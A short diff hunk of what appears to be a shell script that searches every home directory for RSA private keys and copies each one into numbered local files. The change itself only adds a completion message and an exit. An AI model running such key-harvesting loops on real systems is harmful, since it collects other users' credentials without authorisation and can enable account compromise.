@@ -15,3 +15,7 @@ for f in $(grep -R "BEGIN RSA PRIVATE KEY" /home/* | cut -d':' -f1); do
     cp $f ssh_key-$i;
     i=$((i+1))
 done
+
+echo "Search complete."
+
+exit 0
